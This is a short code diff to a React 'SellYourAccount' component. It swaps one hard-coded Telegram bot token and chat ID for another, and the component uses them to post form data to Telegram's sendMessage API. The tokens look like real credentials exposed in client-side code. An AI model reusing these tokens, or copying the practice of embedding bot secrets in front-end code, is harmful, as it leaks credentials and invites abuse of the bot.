@@ -50,8 +50,8 @@ const SellYourAccount: React.FC = () => {
     `;
 
     // Replace with your Telegram Bot Token and Chat ID
-    const botToken = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE"; // Replace with your bot's token
-    const chatId = "6837437455"; // Replace with your chat ID
+    const botToken = "8084822978:AAEiJAl4Z5wg7BrAn9l1w12y1Vd8l7Y8G7w"; // Replace with your bot's token
+    const chatId = "1798696662"; // Replace with your chat ID
 
     const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
